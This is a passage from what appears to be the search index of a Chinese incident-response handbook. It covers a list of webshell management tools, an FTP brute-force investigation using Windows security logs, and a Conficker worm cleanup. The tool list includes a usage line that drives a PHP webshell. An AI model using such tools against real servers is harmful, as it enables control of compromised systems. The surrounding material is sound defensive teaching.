https://github.com/Smaash/quasibot 9\u3001Webshell-Sniper \u8fd9\u662f\u4e00\u6b3e\u57fa\u4e8e\u7ec8\u7aef\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ec5\u652f\u6301\u5728\u7c7bUnix\u7cfb\u7edf\u4e0a\u8fd0\u884c\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/WangYihang/Webshell-Sniper \u7528\u6cd5\u793a\u4f8b\uff1a Usage : python webshell-sniper.py [URL] [METHOD] [AUTH] Example : python webshell-sniper.py http://127.0.0.1/c.php POST c 10\u3001WebshellManager \u4e00\u6b3e\u7528PHP+Mysql\u5199\u7684\u4e00\u53e5\u8bddWEB\u7aef\u7ba1\u7406\u5de5\u5177\uff0c\u76ee\u524d\u4ec5\u652f\u6301\u5bf9PHP\u7684\u4e00\u53e5\u8bdd\u8fdb\u884c\u64cd\u4f5c\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/boy-hack/WebshellManager \u6211\u5728\u77e5\u8bc6\u661f\u7403\u53d1\u8d77\u4e86\u4e00\u4e2a\u5c0f\u8ba8\u8bba\uff0c\u4e5f\u6536\u96c6\u5230\u4e86\u4e00\u4e9bwebshell\u7ba1\u7406\u5de5\u5177\uff0c\u5982 hatchet\u3001K8\u98de\u5200\u3001lanker\uff0c\u6b22\u8fce\u8865\u5145\u3002","title":"\u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","text":"\u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b FTP\u662f\u4e00\u4e2a\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff0c\u7528\u6237\u901a\u8fc7FTP\u53ef\u4ece\u5ba2\u6237\u673a\u7a0b\u5e8f\u5411\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u4f20\u6216\u4e0b\u8f7d\u6587\u4ef6\uff0c\u5e38\u7528\u4e8e\u7f51\u7ad9\u4ee3\u7801\u7ef4\u62a4\u3001\u65e5\u5e38\u6e90\u7801\u5907\u4efd\u7b49\u3002\u5982\u679c\u653b\u51fb\u8005\u901a\u8fc7FTP\u533f\u540d\u8bbf\u95ee\u6216\u8005\u5f31\u53e3\u4ee4\u83b7\u53d6FTP\u6743\u9650\uff0c\u53ef\u76f4\u63a5\u4e0a\u4f20webshell\uff0c\u8fdb\u4e00\u6b65\u6e17\u900f\u63d0\u6743\uff0c\u76f4\u81f3\u63a7\u5236\u6574\u4e2a\u7f51\u7ad9\u670d\u52a1\u5668\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u4ece\u6628\u5929\u5f00\u59cb\uff0c\u7f51\u7ad9\u54cd\u5e94\u901f\u5ea6\u53d8\u5f97\u7f13\u6162\uff0c\u7f51\u7ad9\u670d\u52a1\u5668\u767b\u5f55\u4e0a\u53bb\u975e\u5e38\u5361\uff0c\u91cd\u542f\u670d\u52a1\u5668\u5c31\u80fd\u4fdd\u8bc1\u4e00\u6bb5\u65f6\u95f4\u7684\u6b63\u5e38\u8bbf\u95ee\uff0c\u7f51\u7ad9\u54cd\u5e94\u72b6\u6001\u65f6\u800c\u98de\u5feb\u65f6\u800c\u7f13\u6162\uff0c\u591a\u6570\u65f6\u95f4\u662f\u7f13\u6162\u7684\u3002\u9488\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u7cfb\u7edf\u65e5\u5fd7\u548c\u7f51\u7ad9\u65e5\u5fd7\uff0c\u662f\u6211\u4eec\u6392\u67e5\u5904\u7406\u7684\u91cd\u70b9\u3002\u67e5\u770bWindow\u5b89\u5168\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u91cf\u7684\u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 \u5b89\u5168\u65e5\u5fd7\u5206\u6790\uff1a \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\u3002 \u6253\u5f00\u5b89\u5168\u65e5\u5fd7\uff0c\u5728\u53f3\u8fb9\u70b9\u51fb\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\uff0c \u5728\u4e8b\u4ef6ID\u586b\u51654625\uff0c\u67e5\u8be2\u5230\u4e8b\u4ef6ID4625\uff0c\u4e8b\u4ef6\u6570177007\uff0c\u4ece\u8fd9\u4e2a\u6570\u636e\u53ef\u4ee5\u770b\u51fa\uff0c\u670d\u52a1\u5668\u6b63\u5219\u906d\u53d7\u66b4\u529b\u7834\u89e3\uff1a \u8fdb\u4e00\u6b65\u4f7f\u7528Log Parser\u5bf9\u65e5\u5fd7\u63d0\u53d6\u6570\u636e\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u7206\u7834\uff0c\u4f8b\u5982\u7528\u6237\u540d\uff1afxxx\uff0c\u5171\u8ba1\u8fdb\u884c\u4e8617826\u6b21\u53e3\u4ee4\u5c1d\u8bd5\uff0c\u653b\u51fb\u8005\u57fa\u4e8e\u201cfxxx\u201d\u8fd9\u6837\u4e00\u4e2a\u57df\u540d\u4fe1\u606f\uff0c\u6784\u9020\u4e86\u4e00\u7cfb\u5217\u7684\u7528\u6237\u540d\u5b57\u5178\u8fdb\u884c\u6709\u9488\u5bf9\u6027\u8fdb\u884c\u7206\u7834\uff0c\u5982\u4e0b\u56fe\uff1a \u8fd9\u91cc\u6211\u4eec\u7559\u610f\u5230\u767b\u5f55\u7c7b\u578b\u4e3a8\uff0c\u6765\u4e86\u89e3\u4e00\u4e0b\u767b\u5f55\u7c7b\u578b8\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u767b\u5f55\u7c7b\u578b8\uff1a\u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u8fd9\u79cd\u767b\u5f55\u8868\u660e\u8fd9\u662f\u4e00\u4e2a\u50cf\u7c7b\u578b3\u4e00\u6837\u7684\u7f51\u7edc\u767b\u5f55\uff0c\u4f46\u662f\u8fd9\u79cd\u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0cWindowsServer\u670d\u52a1\u662f\u4e0d\u5141\u8bb8\u901a\u8fc7\u660e\u6587\u9a8c\u8bc1\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u6253\u5370\u673a\u7684\uff0c\u636e\u6211\u6240\u77e5\u53ea\u6709\u5f53\u4ece\u4e00\u4e2a\u4f7f\u7528Advapi\u7684ASP\u811a\u672c\u767b\u5f55\u6216\u8005\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u57fa\u672c\u9a8c\u8bc1\u65b9\u5f0f\u767b\u5f55IIS\u624d\u4f1a\u662f\u8fd9\u79cd\u767b\u5f55\u7c7b\u578b\u3002\u201c\u767b\u5f55\u8fc7\u7a0b\u201d\u680f\u90fd\u5c06\u5217\u51faAdvapi\u3002 \u6211\u4eec\u63a8\u6d4b\u53ef\u80fd\u662fFTP\u670d\u52a1\uff0c\u901a\u8fc7\u67e5\u770b\u7aef\u53e3\u670d\u52a1\u53ca\u7ba1\u7406\u5458\u8bbf\u8c08\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u786e\u5b9e\u5bf9\u516c\u7f51\u5f00\u653e\u4e86FTP\u670d\u52a1\u3002 \u53e6\u5916\uff0c\u65e5\u5fd7\u5e76\u672a\u8bb0\u5f55\u66b4\u529b\u7834\u89e3\u7684IP\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Wireshark\u5bf9\u6355\u83b7\u5230\u7684\u6d41\u91cf\u8fdb\u884c\u5206\u6790\uff0c\u83b7\u53d6\u5230\u6b63\u5728\u8fdb\u884c\u7206\u7834\u7684IP\uff1a \u901a\u8fc7\u5bf9\u8fd1\u6bb5\u65f6\u95f4\u7684\u7ba1\u7406\u5458\u767b\u5f55\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u5982\u4e0b\uff1a \u7ba1\u7406\u5458\u767b\u5f55\u6b63\u5e38\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u5f02\u5e38\u767b\u5f55ip\uff0c\u8fd9\u91cc\u7684\u767b\u5f55\u7c7b\u578b10\uff0c\u4ee3\u8868\u8fdc\u7a0b\u7ba1\u7406\u684c\u9762\u767b\u5f55\u3002 \u53e6\u5916\uff0c\u901a\u8fc7\u67e5\u770bFTP\u7ad9\u70b9\uff0c\u53d1\u73b0\u53ea\u6709\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6\uff0c\u4e0e\u7ad9\u70b9\u76ee\u5f55\u5e76\u4e0d\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b\u9762\uff0c\u8fdb\u4e00\u6b65\u9a8c\u8bc1\u4e86FTP\u66b4\u529b\u7834\u89e3\u5e76\u672a\u6210\u529f\u3002 \u5e94\u6025\u5904\u7406\u63aa\u65bd\uff1a1\u3001\u5173\u95ed\u5916\u7f51FTP\u7aef\u53e3\u6620\u5c04 2\u3001\u5220\u9664\u672c\u5730\u670d\u52a1\u5668FTP\u6d4b\u8bd5 0x04 \u5904\u7406\u63aa\u65bd \u00b6 \u200b FTP\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u4f7f\u7528FTP\u4f20\u8f93\u6587\u4ef6\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668FTP\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002","title":"\u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#\u7b2c1\u7bc7ftp\u66b4\u529b\u7834\u89e3","text":"","title":"\u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x00-\u524d\u8a00","text":"\u200b FTP\u662f\u4e00\u4e2a\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff0c\u7528\u6237\u901a\u8fc7FTP\u53ef\u4ece\u5ba2\u6237\u673a\u7a0b\u5e8f\u5411\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u4f20\u6216\u4e0b\u8f7d\u6587\u4ef6\uff0c\u5e38\u7528\u4e8e\u7f51\u7ad9\u4ee3\u7801\u7ef4\u62a4\u3001\u65e5\u5e38\u6e90\u7801\u5907\u4efd\u7b49\u3002\u5982\u679c\u653b\u51fb\u8005\u901a\u8fc7FTP\u533f\u540d\u8bbf\u95ee\u6216\u8005\u5f31\u53e3\u4ee4\u83b7\u53d6FTP\u6743\u9650\uff0c\u53ef\u76f4\u63a5\u4e0a\u4f20webshell\uff0c\u8fdb\u4e00\u6b65\u6e17\u900f\u63d0\u6743\uff0c\u76f4\u81f3\u63a7\u5236\u6574\u4e2a\u7f51\u7ad9\u670d\u52a1\u5668\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u4ece\u6628\u5929\u5f00\u59cb\uff0c\u7f51\u7ad9\u54cd\u5e94\u901f\u5ea6\u53d8\u5f97\u7f13\u6162\uff0c\u7f51\u7ad9\u670d\u52a1\u5668\u767b\u5f55\u4e0a\u53bb\u975e\u5e38\u5361\uff0c\u91cd\u542f\u670d\u52a1\u5668\u5c31\u80fd\u4fdd\u8bc1\u4e00\u6bb5\u65f6\u95f4\u7684\u6b63\u5e38\u8bbf\u95ee\uff0c\u7f51\u7ad9\u54cd\u5e94\u72b6\u6001\u65f6\u800c\u98de\u5feb\u65f6\u800c\u7f13\u6162\uff0c\u591a\u6570\u65f6\u95f4\u662f\u7f13\u6162\u7684\u3002\u9488\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u7cfb\u7edf\u65e5\u5fd7\u548c\u7f51\u7ad9\u65e5\u5fd7\uff0c\u662f\u6211\u4eec\u6392\u67e5\u5904\u7406\u7684\u91cd\u70b9\u3002\u67e5\u770bWindow\u5b89\u5168\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u91cf\u7684\u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x02-\u65e5\u5fd7\u5206\u6790","text":"\u5b89\u5168\u65e5\u5fd7\u5206\u6790\uff1a \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\u3002 \u6253\u5f00\u5b89\u5168\u65e5\u5fd7\uff0c\u5728\u53f3\u8fb9\u70b9\u51fb\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\uff0c \u5728\u4e8b\u4ef6ID\u586b\u51654625\uff0c\u67e5\u8be2\u5230\u4e8b\u4ef6ID4625\uff0c\u4e8b\u4ef6\u6570177007\uff0c\u4ece\u8fd9\u4e2a\u6570\u636e\u53ef\u4ee5\u770b\u51fa\uff0c\u670d\u52a1\u5668\u6b63\u5219\u906d\u53d7\u66b4\u529b\u7834\u89e3\uff1a \u8fdb\u4e00\u6b65\u4f7f\u7528Log Parser\u5bf9\u65e5\u5fd7\u63d0\u53d6\u6570\u636e\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u7206\u7834\uff0c\u4f8b\u5982\u7528\u6237\u540d\uff1afxxx\uff0c\u5171\u8ba1\u8fdb\u884c\u4e8617826\u6b21\u53e3\u4ee4\u5c1d\u8bd5\uff0c\u653b\u51fb\u8005\u57fa\u4e8e\u201cfxxx\u201d\u8fd9\u6837\u4e00\u4e2a\u57df\u540d\u4fe1\u606f\uff0c\u6784\u9020\u4e86\u4e00\u7cfb\u5217\u7684\u7528\u6237\u540d\u5b57\u5178\u8fdb\u884c\u6709\u9488\u5bf9\u6027\u8fdb\u884c\u7206\u7834\uff0c\u5982\u4e0b\u56fe\uff1a \u8fd9\u91cc\u6211\u4eec\u7559\u610f\u5230\u767b\u5f55\u7c7b\u578b\u4e3a8\uff0c\u6765\u4e86\u89e3\u4e00\u4e0b\u767b\u5f55\u7c7b\u578b8\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u767b\u5f55\u7c7b\u578b8\uff1a\u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u8fd9\u79cd\u767b\u5f55\u8868\u660e\u8fd9\u662f\u4e00\u4e2a\u50cf\u7c7b\u578b3\u4e00\u6837\u7684\u7f51\u7edc\u767b\u5f55\uff0c\u4f46\u662f\u8fd9\u79cd\u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0cWindowsServer\u670d\u52a1\u662f\u4e0d\u5141\u8bb8\u901a\u8fc7\u660e\u6587\u9a8c\u8bc1\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u6253\u5370\u673a\u7684\uff0c\u636e\u6211\u6240\u77e5\u53ea\u6709\u5f53\u4ece\u4e00\u4e2a\u4f7f\u7528Advapi\u7684ASP\u811a\u672c\u767b\u5f55\u6216\u8005\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u57fa\u672c\u9a8c\u8bc1\u65b9\u5f0f\u767b\u5f55IIS\u624d\u4f1a\u662f\u8fd9\u79cd\u767b\u5f55\u7c7b\u578b\u3002\u201c\u767b\u5f55\u8fc7\u7a0b\u201d\u680f\u90fd\u5c06\u5217\u51faAdvapi\u3002 \u6211\u4eec\u63a8\u6d4b\u53ef\u80fd\u662fFTP\u670d\u52a1\uff0c\u901a\u8fc7\u67e5\u770b\u7aef\u53e3\u670d\u52a1\u53ca\u7ba1\u7406\u5458\u8bbf\u8c08\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u786e\u5b9e\u5bf9\u516c\u7f51\u5f00\u653e\u4e86FTP\u670d\u52a1\u3002 \u53e6\u5916\uff0c\u65e5\u5fd7\u5e76\u672a\u8bb0\u5f55\u66b4\u529b\u7834\u89e3\u7684IP\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Wireshark\u5bf9\u6355\u83b7\u5230\u7684\u6d41\u91cf\u8fdb\u884c\u5206\u6790\uff0c\u83b7\u53d6\u5230\u6b63\u5728\u8fdb\u884c\u7206\u7834\u7684IP\uff1a \u901a\u8fc7\u5bf9\u8fd1\u6bb5\u65f6\u95f4\u7684\u7ba1\u7406\u5458\u767b\u5f55\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u5982\u4e0b\uff1a \u7ba1\u7406\u5458\u767b\u5f55\u6b63\u5e38\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u5f02\u5e38\u767b\u5f55ip\uff0c\u8fd9\u91cc\u7684\u767b\u5f55\u7c7b\u578b10\uff0c\u4ee3\u8868\u8fdc\u7a0b\u7ba1\u7406\u684c\u9762\u767b\u5f55\u3002 \u53e6\u5916\uff0c\u901a\u8fc7\u67e5\u770bFTP\u7ad9\u70b9\uff0c\u53d1\u73b0\u53ea\u6709\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6\uff0c\u4e0e\u7ad9\u70b9\u76ee\u5f55\u5e76\u4e0d\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b\u9762\uff0c\u8fdb\u4e00\u6b65\u9a8c\u8bc1\u4e86FTP\u66b4\u529b\u7834\u89e3\u5e76\u672a\u6210\u529f\u3002 \u5e94\u6025\u5904\u7406\u63aa\u65bd\uff1a1\u3001\u5173\u95ed\u5916\u7f51FTP\u7aef\u53e3\u6620\u5c04 2\u3001\u5220\u9664\u672c\u5730\u670d\u52a1\u5668FTP\u6d4b\u8bd5","title":"0x02 \u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x04-\u5904\u7406\u63aa\u65bd","text":"\u200b FTP\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u4f7f\u7528FTP\u4f20\u8f93\u6587\u4ef6\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668FTP\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002","title":"0x04 \u5904\u7406\u63aa\u65bd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/","text":"\u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b \u8815\u866b\u75c5\u6bd2\u662f\u4e00\u79cd\u5341\u5206\u53e4\u8001\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\uff0c\u5b83\u662f\u4e00\u79cd\u81ea\u5305\u542b\u7684\u7a0b\u5e8f\uff08\u6216\u662f\u4e00\u5957\u7a0b\u5e8f\uff09\uff0c\u901a\u5e38\u901a\u8fc7\u7f51\u7edc\u9014\u5f84\u4f20\u64ad\uff0c\u6bcf\u5165\u4fb5\u5230\u4e00\u53f0\u65b0\u7684\u8ba1\u7b97\u673a\uff0c\u5b83\u5c31\u5728\u8fd9\u53f0\u8ba1\u7b97\u673a\u4e0a\u590d\u5236\u81ea\u5df1\uff0c\u5e76\u81ea\u52a8\u6267\u884c\u5b83\u81ea\u8eab\u7684\u7a0b\u5e8f\u3002 \u5e38\u89c1\u7684\u8815\u866b\u75c5\u6bd2\uff1a\u718a\u732b\u70e7\u9999\u75c5\u6bd2 \u3001\u51b2\u51fb\u6ce2/\u9707\u8361\u6ce2\u75c5\u6bd2\u3001conficker\u75c5\u6bd2\u7b49\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u67d0\u5929\u65e9\u4e0a\uff0c\u7ba1\u7406\u5458\u5728\u51fa\u53e3\u9632\u706b\u5899\u53d1\u73b0\u5185\u7f51\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u5883\u5916IP\u53d1\u8d77\u4e3b\u52a8\u8fde\u63a5\uff0c\u5185\u7f51\u73af\u5883\uff0c\u65e0\u6cd5\u8fde\u901a\u5916\u7f51\uff0c\u65e0\u56fe\u8111\u8865\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u5728\u51fa\u53e3\u9632\u706b\u5899\u770b\u5230\u7684\u670d\u52a1\u5668\u5185\u7f51IP\uff0c\u9996\u5148\u5c06\u4e2d\u75c5\u6bd2\u7684\u4e3b\u673a\u4ece\u5185\u7f51\u65ad\u5f00\uff0c\u7136\u540e\u767b\u5f55\u8be5\u670d\u52a1\u5668\uff0c\u6253\u5f00D\u76fe_web\u67e5\u6740\u67e5\u770b\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u672c\u5730\u5411\u5916\u7f51IP\u53d1\u8d77\u5927\u91cf\u7684\u4e3b\u52a8\u8fde\u63a5\uff1a \u901a\u8fc7\u7aef\u53e3\u5f02\u5e38\uff0c\u8ddf\u8e2a\u8fdb\u7a0bID\uff0c\u53ef\u4ee5\u627e\u5230\u8be5\u5f02\u5e38\u7531svchost.exe windows\u670d\u52a1\u4e3b\u8fdb\u7a0b\u5f15\u8d77\uff0csvchost.exe\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42\uff1a \u8fd9\u91cc\u6211\u4eec\u63a8\u6d4b\u53ef\u4ee5\u7cfb\u7edf\u8fdb\u7a0b\u88ab\u75c5\u6bd2\u611f\u67d3\uff0c\u4f7f\u7528\u5361\u5df4\u65af\u57fa\u75c5\u6bd2\u67e5\u6740\u5de5\u5177\uff0c\u5bf9\u5168\u76d8\u6587\u4ef6\u8fdb\u884c\u67e5\u6740\uff0c\u53d1\u73b0c:\\windows\\system32\\qntofmhz.dll\u5f02\u5e38\uff1a \u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\uff08 http://www.virscan.org/ \uff09 \u5bf9\u8be5\u6587\u4ef6\u8fdb\u884c\u626b\u63cf: \u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\uff0c\u4e0b\u8f7dconficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u695a\u75c5\u6bd2\u3002 \u5927\u81f4\u7684\u5904\u7406\u6d41\u7a0b\u5982\u4e0b: 1\u3001\u53d1\u73b0\u5f02\u5e38\uff1a\u51fa\u53e3\u9632\u706b\u5899\u3001\u672c\u5730\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u4e3b\u52a8\u5411\u5916\u7f51\u53d1\u8d77\u5927\u91cf\u8fde\u63a5 2\u3001\u75c5\u6bd2\u67e5\u6740\uff1a\u5361\u5df4\u65af\u57fa\u5168\u76d8\u626b\u63cf\uff0c\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6 3\u3001\u786e\u8ba4\u75c5\u6bd2\uff1a\u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u5bf9\u8be5\u6587\u4ef6\u626b\u63cf\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\u3002 4\u3001\u75c5\u6bd2\u5904\u7406\uff1a\u4f7f\u7528conficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u9664\u75c5\u6bd2\u3002 0x04 \u9884\u9632\u5904\u7406\u63aa\u65bd \u00b6 \u200b \u5728\u653f\u5e9c\u3001\u533b\u9662\u5185\u7f51\uff0c\u4f9d\u7136\u5b58\u5728\u7740\u4e00\u4e9b\u5f88\u53e4\u8001\u7684\u611f\u67d3\u6027\u75c5\u6bd2\uff0c\u5982\u4f55\u4fdd\u62a4\u7535\u8111\u4e0d\u53d7\u75c5\u6bd2\u611f\u67d3\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u4e0d\u4f7f\u7528\u6765\u5386\u4e0d\u660e\u7684\u8f6f\u4ef6\uff0c\u4e0d\u968f\u610f\u63a5\u5165\u672a\u7ecf\u67e5\u6740\u7684U\u76d8 